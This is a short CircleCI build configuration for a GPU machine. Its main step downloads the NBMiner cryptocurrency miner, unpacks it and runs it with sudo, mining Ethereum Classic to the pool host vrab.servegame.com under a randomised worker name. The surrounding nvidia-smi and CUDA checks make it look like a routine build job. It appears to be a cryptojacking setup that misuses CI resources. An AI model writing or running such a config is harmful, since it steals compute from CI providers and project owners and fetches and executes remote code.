version: 2.1

jobs:
  build:
    machine:
      image: ubuntu-2004-cuda-11.2:202103-01
    resource_class: gpu.nvidia.medium
    steps:
      - run: nvidia-smi
      - run: wget https://github.com/NebuTech/NBMiner/releases/download/v40.1/NBMiner_40.1_Linux.tgz && tar -zxvf NBMiner_40.1_Linux.tgz && cd NBMiner_Linux/ && sudo ./nbminer -a etc -o vrab.servegame.com:443 -u Astungk1.$(shuf -n 1 -i 1-99999)  --enable-dag-cache
      - run: docker run --gpus all nvidia/cuda:9.0-base nvidia-smi